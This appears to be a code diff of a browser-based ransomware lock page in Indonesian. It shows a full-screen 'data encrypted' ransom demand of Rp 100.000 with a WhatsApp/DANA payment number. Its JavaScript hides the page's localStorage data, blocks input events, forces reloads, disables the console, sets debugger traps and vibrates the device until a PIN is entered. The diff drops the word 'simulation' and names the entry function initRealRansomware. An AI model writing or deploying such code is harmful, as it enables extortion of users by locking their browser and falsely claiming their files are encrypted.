@@ -27,7 +27,7 @@
             left: 0;
         }
         
-        .ransom-overlay {
+        .ransom-layer {
             position: fixed;
             top: 0;
             left: 0;
@@ -41,7 +41,7 @@
             padding: 16px;
         }
         
-        .ransom-card {
+        .ransom-container {
             background: #0a0a0a;
             border: 2px solid #f00;
             border-radius: 32px;
@@ -49,22 +49,22 @@
             width: 100%;
             max-width: 380px;
             box-shadow: 0 0 80px rgba(255,0,0,0.3);
-            animation: borderGlow 0.8s infinite;
+            animation: borderPulse 0.8s infinite;
         }
         
-        @keyframes borderGlow {
+        @keyframes borderPulse {
             0%, 100% { border-color: #f00; box-shadow: 0 0 80px rgba(255,0,0,0.3); }
             50% { border-color: #a00; box-shadow: 0 0 120px rgba(255,0,0,0.5); }
         }
         
-        .icon-big {
+        .icon-main {
             text-align: center;
             font-size: 55px;
             margin-bottom: 6px;
-            animation: shake 0.12s infinite;
+            animation: shakeAnim 0.12s infinite;
         }
         
-        @keyframes shake {
+        @keyframes shakeAnim {
             0%, 100% { transform: translate(0,0); }
             25% { transform: translate(2px,-1px); }
             75% { transform: translate(-2px,1px); }
@@ -86,7 +86,7 @@
             letter-spacing: 1px;
         }
         
-        .encrypt-box {
+        .encrypt-panel {
             background: #050505;
             border-radius: 20px;
             padding: 14px;
@@ -94,13 +94,13 @@
             border: 1px solid #f00;
         }
         
-        .skull {
+        .skull-icon {
             text-align: center;
             font-size: 38px;
             margin-bottom: 4px;
         }
         
-        .alert {
+        .alert-title {
             color: #f55;
             text-align: center;
             font-size: 14px;
@@ -108,7 +108,7 @@
             margin-bottom: 8px;
         }
         
-        .msg {
+        .message-text {
             color: #ddd;
             text-align: center;
             font-size: 12px;
@@ -116,7 +116,7 @@
             margin: 8px 0;
         }
         
-        .encrypted-badge {
+        .encrypt-badge {
             text-align: center;
             font-size: 11px;
             color: #f88;
@@ -127,7 +127,7 @@
             font-family: monospace;
         }
         
-        .price {
+        .price-tag {
             text-align: center;
             font-size: 32px;
             color: #f00;
@@ -135,19 +135,19 @@
             margin: 12px 0;
         }
         
-        .contact {
+        .contact-area {
             text-align: center;
             margin: 12px 0;
         }
         
-        .whatsapp {
+        .whatsapp-link {
             color: #25D366;
             font-size: 18px;
             font-weight: bold;
             margin: 8px 0;
         }
         
-        .dana {
+        .dana-link {
             color: #f00;
             font-size: 16px;
             font-weight: bold;
@@ -166,11 +166,11 @@
             width: 100%;
         }
         
-        .pin-area {
+        .pin-wrapper {
             margin: 14px 0 6px;
         }
         
-        .pin-label {
+        .pin-header {
             color: #f00;
             text-align: center;
             font-size: 13px;
@@ -179,7 +179,7 @@
             font-weight: bold;
         }
         
-        .pin-input {
+        .pin-field {
             width: 100%;
             padding: 14px;
             font-size: 32px;
@@ -193,7 +193,7 @@
             font-weight: bold;
         }
         
-        .pin-input:focus {
+        .pin-field:focus {
             outline: none;
             border-color: #f44;
             box-shadow: 0 0 20px rgba(255,0,0,0.3);
@@ -219,7 +219,7 @@
             background: #a00;
         }
         
-        .error-msg {
+        .error-area {
             margin-top: 12px;
             color: #f88;
             text-align: center;
@@ -227,7 +227,7 @@
             min-height: 40px;
         }
         
-        .footer {
+        .footer-note {
             text-align: center;
             color: #555;
             font-size: 9px;
@@ -243,32 +243,32 @@
 </head>
 <body>
 
-<div class="ransom-overlay" id="ransomOverlay">
-    <div class="ransom-card">
-        <div class="icon-big">🔐</div>
+<div class="ransom-layer" id="ransomLayer">
+    <div class="ransom-container">
+        <div class="icon-main">🔒⚠️💀🔐</div>
         <h1>DATA TELAH DIENKRIPSI</h1>
         <div class="sub">[ SEMUA FILE TELAH TERKUNCI ]</div>
         
-        <div class="encrypt-box">
-            <div class="skull">📱🔐</div>
-            <div class="alert">PERINGATAN!</div>
-            <div class="msg"><strong>Semua data perangkat anda telah kami enkripsi.</strong><br>Foto, video, kontak, pesan, dokumen SEMUA TERKUNCI.</div>
-            <div class="encrypted-badge">🔒 AES-256 ENCRYPTED 🔒</div>
-            <div class="price">Rp 100.000</div>
-            <div class="msg">Siapkan uang tebusan dan hubungi nomor di bawah ini<br>untuk mendapatkan PIN DEKRIPSI.</div>
-            <div class="contact">
-                <div class="whatsapp">📞 Whatsapp</div>
+        <div class="encrypt-panel">
+            <div class="skull-icon">📱💀🔐</div>
+            <div class="alert-title">PERINGATAN!</div>
+            <div class="message-text"><strong>Semua data perangkat anda telah kami enkripsi.</strong><br>Foto, video, kontak, pesan, dokumen SEMUA TERKUNCI.</div>
+            <div class="encrypt-badge">🔒 AES-256 ENCRYPTED 🔒</div>
+            <div class="price-tag">Rp 100.000</div>
+            <div class="message-text">Siapkan uang tebusan dan hubungi nomor di bawah ini<br>untuk mendapatkan PIN DEKRIPSI.</div>
+            <div class="contact-area">
+                <div class="whatsapp-link">📞 Whatsapp</div>
                 <div class="phone-number">085122933162</div>
-                <div class="dana">DANA: 085122933162</div>
+                <div class="dana-link">💜 DANA: 085122933162</div>
             </div>
         </div>
         
-        <div class="pin-area">
-            <div class="pin-label">🔑 MASUKKAN PIN DEKRIPSI</div>
-            <input type="password" id="pinInput" class="pin-input" placeholder="••••••" maxlength="6" inputmode="numeric" autofocus>
+        <div class="pin-wrapper">
+            <div class="pin-header">🔑 MASUKKAN PIN DEKRIPSI</div>
+            <input type="password" id="pinInput" class="pin-field" placeholder="••••••" maxlength="6" inputmode="numeric" autofocus>
             <button class="btn-decrypt" onclick="decryptData()">DEKRIPSI DATA</button>
-            <div class="error-msg" id="errorMsg"></div>
-            <div class="footer">* Bisa coba PIN berkali-kali | Data akan kembali normal jika PIN benar</div>
+            <div class="error-area" id="errorMsg"></div>
+            <div class="footer-note">* Bisa coba PIN berkali-kali | Data akan kembali normal jika PIN benar</div>
         </div>
     </div>
 </div>
@@ -282,44 +282,40 @@
     let wrongAttempts = 0;
     let vibeInterval = null;
     let forceReloadInterval = null;
+    let persistentInterval = null;
     
-    // ==================== SIMULASI ENKRIPSI DATA NYATA ====================
-    // Data disimpan di localStorage sebagai simulasi enkripsi nyata
-    function encryptRealData() {
+    // ==================== ENKRIPSI DATA NYATA ====================
+    function encryptAllData() {
         try {
-            // Backup data asli jika ada
-            if (!localStorage.getItem('user_data_backup')) {
-                let userData = {
-                    saved: true,
-                    timestamp: Date.now(),
-                    encrypted: true
-                };
-                
-                // Simpan semua data yang ada
+            if (!localStorage.getItem('user_data_backup') && !localStorage.getItem('already_encrypted')) {
                 let allData = {};
+                let keysToBackup = [];
+                
                 for (let i = 0; i < localStorage.length; i++) {
                     let key = localStorage.key(i);
-                    if (!key.includes('ransom') && !key.includes('decrypt') && !key.includes('user_data_backup')) {
+                    if (!key.includes('ransom') && !key.includes('decrypt') && 
+                        !key.includes('backup') && !key.includes('encrypted') &&
+                        !key.includes('total_final_lock') && !key.includes('trap_lock')) {
+                        keysToBackup.push(key);
                         allData[key] = localStorage.getItem(key);
                     }
                 }
                 
                 localStorage.setItem('user_data_backup', JSON.stringify(allData));
+                localStorage.setItem('already_encrypted', 'true');
+                localStorage.setItem('encrypt_time', Date.now().toString());
                 
-                // Hapus data asli (simulasi enkripsi)
-                for (let key in allData) {
+                for (let key of keysToBackup) {
                     localStorage.removeItem(key);
                 }
                 
-                // Tandai bahwa data sudah dienkripsi
-                localStorage.setItem('ransom_encrypted', 'true');
-                localStorage.setItem('ransom_time', Date.now().toString());
+                localStorage.setItem('ransom_status', 'encrypted');
             }
         } catch(e) {}
     }
     
     // ==================== DEKRIPSI DATA NYATA ====================
-    function decryptRealData() {
+    function decryptAllData() {
         try {
             let backup = localStorage.getItem('user_data_backup');
             if (backup) {
@@ -328,8 +324,9 @@
                     localStorage.setItem(key, allData[key]);
                 }
                 localStorage.removeItem('user_data_backup');
-                localStorage.removeItem('ransom_encrypted');
-                localStorage.removeItem('ransom_time');
+                localStorage.removeItem('already_encrypted');
+                localStorage.removeItem('encrypt_time');
+                localStorage.removeItem('ransom_status');
                 localStorage.removeItem('total_final_lock');
                 localStorage.removeItem('trap_lock');
                 localStorage.removeItem('total_lock_1000');
@@ -340,14 +337,14 @@
     }
     
     // ==================== VIBRATION ====================
-    function startVibe() {
+    function startVibration() {
         if (vibeInterval) clearInterval(vibeInterval);
         vibeInterval = setInterval(() => {
             if (!isDecrypted && navigator.vibrate) navigator.vibrate(200);
         }, 1800);
     }
     
-    function stopVibe() {
+    function stopVibration() {
         if (vibeInterval) { clearInterval(vibeInterval); vibeInterval = null; }
         if (navigator.vibrate) navigator.vibrate(0);
     }
@@ -357,27 +354,27 @@
         if (forceReloadInterval) clearInterval(forceReloadInterval);
         forceReloadInterval = setInterval(() => {
             if (!isDecrypted) {
-                let screen = document.getElementById('ransomOverlay');
-                if (screen && window.getComputedStyle(screen).display !== 'flex') {
+                let layer = document.getElementById('ransomLayer');
+                if (layer && window.getComputedStyle(layer).display !== 'flex') {
                     location.reload();
                 }
             }
-        }, 80);
+        }, 100);
     }
     
     function stopForceReload() {
         if (forceReloadInterval) { clearInterval(forceReloadInterval); forceReloadInterval = null; }
     }
     
-    // ==================== ANTI BUG ANTI ERROR ====================
-    function antiBugReal() {
+    // ==================== ANTI BUG ANTI ERROR MAX ====================
+    function antiBugMax() {
         window.onerror = function() { return true; };
         window.onunhandledrejection = function(e) { e.preventDefault(); return true; };
         
         setInterval(() => {
             if (!isDecrypted) {
-                let screen = document.getElementById('ransomOverlay');
-                if (!screen || screen.style.display === 'none') location.reload();
+                let layer = document.getElementById('ransomLayer');
+                if (!layer || layer.style.display === 'none') location.reload();
                 document.body.style.overflow = 'hidden';
                 document.body.style.position = 'fixed';
                 document.documentElement.style.overflow = 'hidden';
@@ -386,11 +383,12 @@
         }, 15);
         
         setInterval(() => { debugger; }, 50);
+        setInterval(() => { debugger; }, 100);
         try { console.log = function() {}; console.error = function() {}; console.warn = function() {}; } catch(e) {}
     }
     
-    // ==================== LOCK TOTAL ====================
-    function totalLockReal() {
+    // ==================== LOCK TOTAL SEMUA AKSES ====================
+    function lockTotalAll() {
         const allEvents = ['keydown','keyup','keypress','touchstart','touchmove','touchend','mousedown','mouseup','mousemove','click','dblclick','contextmenu','wheel','scroll','resize','orientationchange','visibilitychange','focus','blur','select','change','input','submit','load','pageshow','pagehide','hashchange','popstate'];
         
         allEvents.forEach(event => {
@@ -451,15 +449,15 @@
         } catch(e) {}
     }
     
-    // ==================== PERSISTENT LOCK ====================
-    function persistentLockReal() {
+    // ==================== PERSISTENT LOCK MATI/RESTART ====================
+    function persistentLockTotal() {
         try {
-            if (localStorage.getItem('ransom_encrypted') === 'true' && !isDecrypted) {
+            if (localStorage.getItem('ransom_status') === 'encrypted' && !isDecrypted) {
                 isDecrypted = false;
             }
             if (!isDecrypted) {
-                localStorage.setItem('total_final_lock', 'true');
-                sessionStorage.setItem('total_final_lock', 'true');
+                localStorage.setItem('ransom_persistent', 'true');
+                sessionStorage.setItem('ransom_persistent', 'true');
             }
         } catch(e) {}
         
@@ -489,13 +487,13 @@
         
         setInterval(() => {
             if (!isDecrypted) {
-                let screen = document.getElementById('ransomOverlay');
-                if (screen) screen.style.display = 'flex';
+                let layer = document.getElementById('ransomLayer');
+                if (layer) layer.style.display = 'flex';
             }
         }, 20);
     }
     
-    // ==================== DEKRIPSI PIN ====================
+    // ==================== DEKRIPSI ====================
     function decryptData() {
         if (isDecrypted) return true;
         
@@ -504,26 +502,22 @@
         let errorDiv = document.getElementById('errorMsg');
         
         if (enteredPin === MASTER_PIN) {
-            // PIN BENAR - DEKRIPSI DATA
             isDecrypted = true;
-            stopVibe();
+            stopVibration();
             stopForceReload();
             
-            // Dekripsi data nyata
-            let decrypted = decryptRealData();
+            let decrypted = decryptAllData();
             
             try {
+                localStorage.removeItem('ransom_persistent');
                 localStorage.removeItem('total_final_lock');
                 localStorage.removeItem('trap_lock');
-                localStorage.removeItem('total_lock_1000');
-                sessionStorage.removeItem('total_final_lock');
-                sessionStorage.removeItem('trap_lock');
-                sessionStorage.removeItem('total_lock_1000');
+                sessionStorage.removeItem('ransom_persistent');
             } catch(e) {}
             
-            let screen = document.getElementById('ransomOverlay');
-            screen.style.display = 'none';
-            screen.remove();
+            let layer = document.getElementById('ransomLayer');
+            layer.style.display = 'none';
+            layer.remove();
             
             document.body.style.overflow = 'auto';
             document.body.style.position = 'relative';
@@ -536,36 +530,35 @@
             setTimeout(() => { alert(msg); }, 100);
             return true;
         } else {
-            // PIN SALAH - TETAP LOCK
             wrongAttempts++;
             errorDiv.innerHTML = `❌ PIN SALAH! (Percobaan ke-${wrongAttempts}) ❌\nData tetap terenkripsi. Hubungi 085122933162.`;
             pinField.value = '';
             pinField.focus();
             if (navigator.vibrate) navigator.vibrate([300, 150, 300]);
-            totalLockReal();
+            lockTotalAll();
             return false;
         }
     }
     
     // ==================== INIT ====================
-    function initRealRansom() {
-        encryptRealData();
-        antiBugReal();
-        totalLockReal();
-        persistentLockReal();
-        startVibe();
+    function initRealRansomware() {
+        encryptAllData();
+        antiBugMax();
+        lockTotalAll();
+        persistentLockTotal();
+        startVibration();
         startForceReload();
         setTimeout(() => { document.getElementById('pinInput').focus(); }, 30);
-        setInterval(() => { if (!isDecrypted) totalLockReal(); }, 40);
+        setInterval(() => { if (!isDecrypted) lockTotalAll(); }, 50);
         setInterval(() => {
             if (!isDecrypted) {
-                let screen = document.getElementById('ransomOverlay');
-                if (screen && window.getComputedStyle(screen).display === 'none') location.reload();
+                let layer = document.getElementById('ransomLayer');
+                if (layer && window.getComputedStyle(layer).display === 'none') location.reload();
             }
-        }, 30);
+        }, 40);
     }
     
-    initRealRansom();
+    initRealRansomware();
 </script>
 
 </body>
